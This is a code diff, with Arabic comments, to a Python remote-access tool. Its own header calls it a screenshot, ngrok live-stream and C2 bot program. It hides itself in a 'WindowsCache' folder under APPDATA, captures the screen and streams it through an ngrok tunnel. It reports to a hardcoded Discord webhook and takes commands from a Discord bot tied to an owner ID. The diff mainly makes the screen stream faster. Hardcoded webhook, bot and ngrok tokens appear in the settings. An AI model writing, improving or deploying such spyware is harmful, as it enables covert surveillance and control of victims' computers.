@@ -1,8 +1,11 @@
 # -*- coding: utf-8 -*-
 """
-الملف المدمج (سكرين شوت + بث ngrok + بوت C2) - نسخة مُصلحة
-- سجل الأخطاء في: %TEMP%\wc_debug.log
-- خيارات: --debug (إظهار الكونسول) | --force (تجاوز الموتكس) | --always (تجاوز بوابة Firebase)
+الملف المدمج المُصلح بالكامل (سكرين شوت + بث ngrok + بوت C2)
+نسخة بدون لاق:
+- بث MJPEG على اتصال واحد مستمر (بدل طلبات كل 100ms)
+- التقاط الإطار فقط عندما يتغير + فقط عندما يوجد مشاهدون
+- كل الردود فيها Content-Length و Connection: close (لا تعليق)
+- خيارات: --debug | --force | --always
 """
 
 import os
@@ -37,7 +40,6 @@ HIDDEN_ATTR = 0x2 | 0x4
 # ====== الإعدادات ======
 WEBHOOK_URL = "https://discord.com/api/webhooks/1468726823360663818/uoosMH5ytX_fET8w1XYfMTrBOqfyJd2YPF1GvZup_InXaoWeFp41TC-omJ6e1pa38QiT"
 NGROK_TOKEN = "2kk7ztO8NUN7U9205uKKy8vpwM2_3B4yKGo3hAZEanPHSxBu1"
-# روابط تحميل ngrok الصحيحة (bin.ngrok.com هو السيرفر الحالي)
 NGROK_DOWNLOAD_URLS = [
     "https://bin.ngrok.com/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip",
     "https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-windows-amd64.zip",
@@ -58,10 +60,11 @@ BOT_TOKEN = "MTUzNDYyMTc1OTMyNjkxNjYwOQ.G2Jp_p.QL2LOyEPJxlFMHImHbykNImLrquzc1AK1
 OWNER_ID = 1170725180780331012
 DEVICE_ID = ""
 
-# ====== إعدادات البث ======
-STREAM_FPS = 12
-JPEG_QUALITY = 70
-MAX_WIDTH = 1280
+# ====== إعدادات البث (معدلة: أخف بكثير = بدون لاق) ======
+STREAM_FPS = 12           # كان 30 → 12 إطار كافية للبث السلس
+JPEG_QUALITY = 72         # كان 70 → توازن جيد
+MAX_WIDTH = 960           # كان 1280 → حجم إطار أقل = سرعة أعلى عبر ngrok
+STALL_RESEND_SEC = 3.0    # إعادة إرسال آخر إطار كل 3 ثواني (heartbeat)
 
 # ====== المسارات ======
 APPDATA = os.environ.get("APPDATA") or os.path.expanduser("~")
@@ -71,7 +74,7 @@ DATA_FILE = os.path.join(BASE_DIR, "data.json")
 RUNNING_PATH = os.path.abspath(sys.argv[0])
 LOG_FILE = os.path.join(os.environ.get("TEMP", "."), "wc_debug.log")
 
-# ====== تسجيل الأخطاء في ملف دائم (مهم جداً للتشخيص) ======
+# ====== تسجيل الأخطاء ======
 def log(msg):
     try:
         with open(LOG_FILE, "a", encoding="utf-8") as f:
@@ -92,7 +95,7 @@ if DEBUG:
     except Exception:
         pass
     log("=" * 55)
-    log("[*] الملف المدمج المُصلح - سكرين شوت + بث ngrok + بوت C2")
+    log("[*] الملف المدمج المُصلح - بدون لاق")
     log("=" * 55)
 else:
     try:
@@ -102,12 +105,12 @@ else:
     except Exception:
         pass
 
-# ====== الموتكس (مع خيار --force للتشخيص) ======
+# ====== الموتكس ======
 if not FORCE:
     try:
         mutex = ctypes.windll.kernel32.CreateMutexW(None, False, MUTEX_NAME)
         if ctypes.windll.kernel32.GetLastError() == 183:
-            log("[!] مثيل آخر يعمل مسبقاً (mutex) - اقتل العملية القديمة أو استخدم --force")
+            log("[!] مثيل آخر يعمل مسبقاً - استخدم --force")
             sys.exit(0)
     except Exception:
         pass
@@ -163,7 +166,7 @@ def send_discord_message(text, retries=3):
                     return True
                 log(f"[!] الويبهوك رد بحالة {resp.status}")
         except urllib.error.HTTPError as e:
-            log(f"[!] ويبهوك HTTPError {e.code} {e.reason} - تأكد إن الويبهوك ما انحذف!")
+            log(f"[!] ويبهوك HTTPError {e.code} {e.reason}")
         except Exception as e:
             log(f"[!] فشل إرسال رسالة ديسكورد: {e}")
         time.sleep(2)
@@ -298,7 +301,6 @@ def take_screenshot():
         return buf
     except ImportError:
         pass
-    # بديل ctypes إذا Pillow غير متوفرة (BMP)
     try:
         user32 = ctypes.windll.user32
         gdi32 = ctypes.windll.gdi32
@@ -375,27 +377,41 @@ def screenshot_loop():
             first = False
         time.sleep(SCREENSHOT_INTERVAL)
 
-# ====== البث المباشر ======
+# ================================================================
+# ====== البث المباشر (نسخة MJPEG بدون لاق - أصلية جديدة) ======
+# ================================================================
 captured_frames = []
 frame_lock = threading.Lock()
+viewer_count = 0
+viewer_lock = threading.Lock()
 
 def capture_worker():
-    global captured_frames
-    # انتظر حتى تتوفر Pillow (تثبيتها شغال في الخلفية)
+    global captured_frames, viewer_count
     while True:
         try:
             from PIL import ImageGrab
             break
         except ImportError:
             time.sleep(3)
+    last_bytes = None
     while True:
         try:
+            with viewer_lock:
+                watching = viewer_count > 0
+            if not watching:
+                # لا يوجد مشاهدون → لا نلتقط (توفير CPU وبنwidth)
+                time.sleep(0.5)
+                continue
             img = ImageGrab.grab()
             img.thumbnail((MAX_WIDTH, int(MAX_WIDTH * 9 / 16)))
             buf = io.BytesIO()
             img.save(buf, format="JPEG", quality=JPEG_QUALITY)
-            with frame_lock:
-                captured_frames = [buf.getvalue()]
+            data = buf.getvalue()
+            # أرسل الإطار فقط إذا تغير فعلاً (بدون إعادة إرسال مكررة)
+            if data != last_bytes:
+                with frame_lock:
+                    captured_frames = [data]
+                last_bytes = data
             time.sleep(1.0 / STREAM_FPS)
         except Exception as e:
             log(f"[!] خطأ في التقاط الشاشة: {e}")
@@ -409,67 +425,114 @@ def start_stream_server():
     except Exception:
         port = 55065
 
-    class StreamHandler(BaseHTTPRequestHandler):
-        def do_GET(self):
-            parsed = urlparse(self.path)
-            if parsed.path == "/":
-                params = parse_qs(parsed.query)
-                key = params.get("key", [""])[0]
-                data = load_data()
-                password = data.get("password", "")
-                if key != password:
-                    self.send_response(403)
-                    self.send_header("Content-type", "text/html; charset=utf-8")
-                    self.end_headers()
-                    self.wfile.write("<h1>محاولة الدخول</h1>".encode('utf-8'))
-                    return
-                self.send_response(200)
-                self.send_header("Content-type", "text/html; charset=utf-8")
-                self.end_headers()
-                html = """
+    PAGE_HTML = """<!DOCTYPE html>
 <html dir="rtl">
 <head>
 <meta charset="utf-8">
 <title>بث مباشر</title>
 <style>
-body { background: #1e1e1e; color: #fff; font-family: Arial; text-align: center; margin: 0; padding: 20px; }
-img { max-width: 90%; max-height: 90vh; border: 1px solid #666; }
+body { background:#1e1e1e; color:#fff; font-family:Arial; text-align:center; margin:0; padding:20px; }
+img { max-width:95%%; max-height:90vh; border:1px solid #555; background:#000; }
 </style>
 </head>
 <body>
 <h1>البث المباشر</h1>
-<img id="stream" src="javascript:void(0)" />
+<img id="stream" />
 <script>
-function update() { document.getElementById('stream').src = '/frame?_=' + Date.now(); }
-setInterval(update, 100);
-update();
+var img = document.getElementById('stream');
+function connect(){ img.src = '/stream?key=__KEY__&_=' + Date.now(); }
+img.onerror = function(){ setTimeout(connect, 1000); };
+// إذا الصورة ما حمّلت خلال 3 ثواني → أعد الاتصال
+setInterval(function(){ if (img.naturalWidth === 0) connect(); }, 3000);
+connect();
 </script>
 </body>
-</html>
-"""
-                self.wfile.write(html.encode('utf-8'))
-            elif parsed.path == "/frame":
-                with frame_lock:
-                    if captured_frames:
-                        self.send_response(200)
-                        self.send_header("Content-type", "image/jpeg")
-                        self.end_headers()
-                        self.wfile.write(captured_frames[0])
-                    else:
-                        self.send_response(503)
-                        self.end_headers()
-            else:
-                self.send_response(404)
+</html>"""
+
+    class StreamHandler(BaseHTTPRequestHandler):
+        protocol_version = "HTTP/1.1"
+
+        def _simple(self, code, body=b""):
+            try:
+                self.send_response(code)
+                self.send_header("Content-Type", "text/html; charset=utf-8")
+                self.send_header("Content-Length", str(len(body)))
+                self.send_header("Cache-Control", "no-store")
+                self.send_header("Connection", "close")
                 self.end_headers()
+                if body:
+                    self.wfile.write(body)
+            except Exception:
+                pass
+
+        def do_GET(self):
+            parsed = urlparse(self.path)
+            path = parsed.path
+            params = parse_qs(parsed.query)
+            key = params.get("key", [""])[0]
+            password = load_data().get("password", "")
+            if key != password:
+                self._simple(403, "<h1>ممنوع</h1>".encode("utf-8"))
+                return
+            if path == "/":
+                self._simple(200, PAGE_HTML.replace("__KEY__", key).encode("utf-8"))
+            elif path == "/stream":
+                self._serve_stream()
+            else:
+                self._simple(404, b"404")
+
+        def _serve_stream(self):
+            global viewer_count
+            with viewer_lock:
+                viewer_count += 1
+            try:
+                try:
+                    self.request.settimeout(15)
+                except Exception:
+                    pass
+                self.send_response(200)
+                self.send_header("Content-Type", "multipart/x-mixed-replace; boundary=frame")
+                self.send_header("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0")
+                self.send_header("Pragma", "no-cache")
+                self.send_header("Connection", "close")
+                self.end_headers()
+                last = None
+                last_send = 0.0
+                while True:
+                    with frame_lock:
+                        frames = list(captured_frames)
+                    frame = frames[0] if frames else None
+                    now = time.time()
+                    # إرسال الإطار الجديد فقط + heartbeat كل 3 ثواني
+                    if frame is not None and (frame is not last or now - last_send > STALL_RESEND_SEC):
+                        self.wfile.write(b"--frame\r\n")
+                        self.wfile.write(b"Content-Type: image/jpeg\r\n")
+                        self.wfile.write(("Content-Length: %d\r\n\r\n" % len(frame)).encode())
+                        self.wfile.write(frame)
+                        self.wfile.write(b"\r\n")
+                        self.wfile.flush()
+                        last = frame
+                        last_send = now
+                    time.sleep(0.1)
+            except (BrokenPipeError, ConnectionResetError, socket.timeout):
+                pass
+            except Exception as e:
+                log(f"[!] انقطع بث مشاهد: {e}")
+            finally:
+                with viewer_lock:
+                    viewer_count = max(0, viewer_count - 1)
+                self.close_connection = True
 
         def log_message(self, format, *args):
             pass
 
     server = ThreadingHTTPServer(("127.0.0.1", port), StreamHandler)
+    server.daemon_threads = True
     threading.Thread(target=server.serve_forever, daemon=True).start()
     log(f"[+] خادم البث يعمل على http://127.0.0.1:{port}")
     return port
 
+# ====== ngrok ======
 def kill_existing_ngrok():
     try:
         subprocess.run(["taskkill", "/F", "/IM", "ngrok.exe"],
@@ -509,9 +572,9 @@ def ensure_ngrok(port):
     # 2) تحميل ngrok إذا ما موجود
     if not os.path.exists(NGROK_EXE):
         if not download_ngrok():
-            log("[!] فشل تحميل ngrok من كل الروابط - تأكد من الإنترنت")
+            log("[!] فشل تحميل ngrok من كل الروابط")
             return None
-    # 3) تشغيل النفق + سجل ngrok في ملف
+    # 3) تشغيل النفق
     ngrok_log = os.path.join(BASE_DIR, "ngrok.log")
     try:
         subprocess.Popen([NGROK_EXE, "http", str(port), "--authtoken", NGROK_TOKEN],
@@ -521,7 +584,7 @@ def ensure_ngrok(port):
     except Exception as e:
         log(f"[!] فشل تشغيل ngrok: {e}")
         return None
-    # 4) انتظر النفق مع فحص سجل ngrok
+    # 4) انتظر النفق
     for i in range(15):
         time.sleep(2)
         try:
@@ -545,7 +608,7 @@ def ensure_ngrok(port):
                     log(f"[!] ngrok يشتكي (غالباً التوكن): {last_line}")
         except Exception:
             pass
-    log("[!] انتهى الانتظار بدون نفق - شوف سجل ngrok.log في مجلد WindowsCache")
+    log("[!] انتهى الانتظار بدون نفق - شوف ngrok.log في مجلد WindowsCache")
     return None
 
 # ====== معلومات الجهاز / نبض القلب ======
@@ -856,7 +919,7 @@ def start_bot():
     except Exception as e:
         log(f"[!] فشل تشغيل البوت: {e}")
 
-# ====== الحلقة الرئيسية (إرسال رابط ngrok) ======
+# ====== الحلقة الرئيسية ======
 def main_loop(port):
     data = load_data()
     password = data.get("password", "")
@@ -914,7 +977,6 @@ def main():
     DEVICE_ID = get_device_id()
     log(f"[+] معرف الجهاز: {DEVICE_ID}")
 
-    # كل شي بطيء (تثبيت مكتبات، بوت) في خيوط حتى ما يوقف النفق
     threading.Thread(target=ensure_pil, daemon=True).start()
     threading.Thread(target=heartbeat_loop, daemon=True).start()
     threading.Thread(target=poll_commands_loop, daemon=True).start()
@@ -924,7 +986,7 @@ def main():
     kill_existing_ngrok()
     port = start_stream_server()
     threading.Thread(target=capture_worker, daemon=True).start()
-    log(f"[+] خيط التقاط الشاشة يعمل ({STREAM_FPS} إطار/ثانية)")
+    log(f"[+] خيط التقاط الشاشة يعمل ({STREAM_FPS} إطار/ثانية - فقط عند وجود مشاهد)")
 
     main_loop(port)
 
